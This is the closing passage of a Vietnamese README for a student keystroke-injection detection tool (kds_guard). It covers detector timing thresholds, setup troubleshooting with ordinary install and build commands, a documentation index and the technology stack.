burst_threshold_ms = 50.0

[detector]
ft_mean_threshold_ms = 30.0
ft_cv_threshold      = 0.15
max_human_speed      = 20.0

[policy]
enable_alerts       = true
enable_soft_block    = false   # true = bật chặn input
soft_block_duration_ms = 2000
```

---

## Xử lý lỗi thường gặp

### `ModuleNotFoundError: No module named 'websockets'`
```powershell
pip install websockets
```

### Dashboard không hiển thị dữ liệu realtime
```
1. Đảm bảo ws_bridge.py đang chạy ở Terminal 2
2. Kiểm tra log: phải thấy "[BRIDGE] WebSocket server dang chay tai ws://localhost:8765"
3. Refresh trang Dashboard (F5)
```

### `Access Denied` khi chạy kds_guard.exe
→ Mở PowerShell bằng **Run as Administrator**

### Rust engine chưa build
```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO\kds_guard"
cargo build --release
# Lần đầu: 2-5 phút. Lần sau: ~30 giây.
```

### Dataset trống sau khi chạy integrate_datasets.py
→ Copy file CSV vào `data/raw/rust/` rồi chạy lại:
```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO"
python scripts/integrate_datasets.py --rust-collect --merge
```

---

## Tài liệu chi tiết

| File | Nội dung |
|------|---------|
| `baocao/HUONGDAN_KICHHOAT.md` | Hướng dẫn kích hoạt A-Z từng bước |
| `baocao/HUONGDAN_DATASET.md` | Quy trình thu thập & xử lý dataset |
| `baocao/HUONGDAN_THUTHAP.md` | Hướng dẫn collector tool |
| `baocao/THUTHAP.md` | Tài liệu kỹ thuật thu thập dữ liệu |
| `QUYTRINHXULI_DATASET.md` | Quy trình xử lý dataset |
| `kds_guard/src/detector.rs` | Source code 8 luật phát hiện |

---

## Công nghệ

| Thành phần | Công nghệ |
|-----------|-----------|
| Engine | Rust (performance, memory safety) |
| Bắt phím | rdev (cross-platform) + WinAPI BlockInput |
| Desktop App | Electron 42 + TypeScript |
| Dashboard | React 18 + TypeScript + MUI v5 + ECharts |
| Real-time | WebSocket bridge (Python websockets) |
| ML | scikit-learn (RF, IF, OCSVM) |
| Visualization | ECharts |
| Packaging | electron-builder |

---

Đồ án Cơ sở – 2026
